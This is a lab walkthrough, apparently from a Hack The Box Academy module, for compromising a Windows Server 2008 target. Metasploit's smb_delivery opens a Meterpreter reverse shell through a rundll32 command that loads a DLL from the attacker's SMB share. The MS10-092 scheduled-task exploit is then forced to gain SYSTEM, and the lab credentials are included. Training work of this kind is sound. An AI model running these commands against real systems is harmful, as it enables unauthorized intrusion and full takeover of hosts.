# Windows Server

## 🔍 Objective
Obtain a shell on the target Windows host and escalate privileges to Administrator. Retrieve the contents of flag.txt located on the Administrator Desktop.

## 🖥️ Target Details
RDP Target IP: 10.129.226.66

Hostname: ACADEMY-WINLPE-2K8

Username: htb-student

Password: HTB_@cademy_stdnt!

My Host IP: 10.10.14.45

## 🛠️ Step 1: Start Metasploit Framework
```bash
sudo msfconsole
```
![image](https://github.com/user-attachments/assets/3aeb2ff4-caf4-42ec-bc5e-8088d47ca8e8)

## 🛠️ Step 2: Search and Use SMB Delivery Exploit
```bash
search smb_delivery
use 0
```
![image](https://github.com/user-attachments/assets/083b4311-cc93-4bdf-98b0-c67d0ad142e8)

**Set Required Options**
```bash
set srvhost 10.10.14.45
set lhost 10.10.14.45
set target 0
exploit
```
**Metasploit Output:**
```bash
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 10.10.14.45:4444
[*] Server is running. Listening on 10.10.14.45:445
[*] Run the following command on the target machine:
rundll32.exe \\10.10.14.45\lFTVY\test.dll,0
```
![image](https://github.com/user-attachments/assets/25aae4e5-0d19-47c2-81ee-dfc9e1500c70)

## 💻 Step 3: Execute Payload on Target via RDP
In the RDP session, execute:
```bash
rundll32.exe \\10.10.14.45\lFTVY\test.dll,0
```
## ✅ Step 4: Shell Obtained on Host
You will observe NTLM authentication response and eventually a Meterpreter session:
```bash
[*] Sending stage (177734 bytes) to 10.129.226.66
[*] Meterpreter session 1 opened ...
```
**Check sessions:**
```bash
sessions
```
**Interact with session:**
```bash
sessions -i 1
```
![image](https://github.com/user-attachments/assets/7218198a-bfbb-4b91-9320-12058b0bf3e0)

## 🧠 Step 5: Process Migration
**List processes:**
```bash
ps
```
**Find conhost.exe (or other stable processes) and note PID, then:**
```bash
migrate 2520  # (example PID)
```
**Successful migration message:**
```bash
[*] Migrating from XXXX to 2520...
[*] Migration completed successfully.
```
![image](https://github.com/user-attachments/assets/6c7f8c5f-e8bb-438a-a557-34ea62045d6d)

## 🔍 Step 6: Privilege Escalation - MS10-092
Search for exploit:
```bash
search 2010-3338
use 0
```
![image](https://github.com/user-attachments/assets/91c856af-ec65-4e58-94fe-38dfacff94fb)

**Set Exploit Options:**
```bash
set session 1
set lhost 10.10.14.45
set lport 4443
```
![image](https://github.com/user-attachments/assets/87e1b9ee-d001-4834-981c-1d8228b4d334)

**Show options to confirm:**
```bash
show options
```
**Run Exploit:**
```bash
exploit
```
**Initial result:**
```bash
[-] Exploit aborted due to failure: not-vulnerable...
```
**Force the exploit to run anyway:**
```bash
set ForceExploit true
exploit
```
**You should see:**
`
[*] Creating task...
[*] SUCCESS: The parameters of scheduled task ...
`
![image](https://github.com/user-attachments/assets/6f0b0c2a-1494-429e-ae52-7110e9f41b42)

## 🔐 Step 7: Confirm Privilege Escalation
You will receive a new session or shell as NT AUTHORITY\SYSTEM.

**Check whoami:**
`whoami`

**Expected Output:**
```bash
nt authority\system
```
## 🏁 Step 8: Retrieve the Flag
**Navigate to Administrator desktop:**
```bash
cd C:\Users\Administrator\Desktop
dir
type flag.txt
```
![image](https://github.com/user-attachments/assets/a8f2e06b-8c5a-4b88-b7e0-e1e8ed0d39b5)

## 📝 Summary

| Step                              | Action                          | Status |
|-----------------------------------|----------------------------------|--------|
| 1                                 | RDP Access                       | ✅     |
| 2                                 | SMB Delivery                     | ✅     |
| 3                                 | Shell via DLL                    | ✅     |
| 4                                 | Process Migration                | ✅     |
| 5                                 | Privilege Escalation with MS10-092 | ✅  |
| 6                                 | SYSTEM Access                    | ✅     |
| 7                                 | Flag Retrieved                   | ✅     |

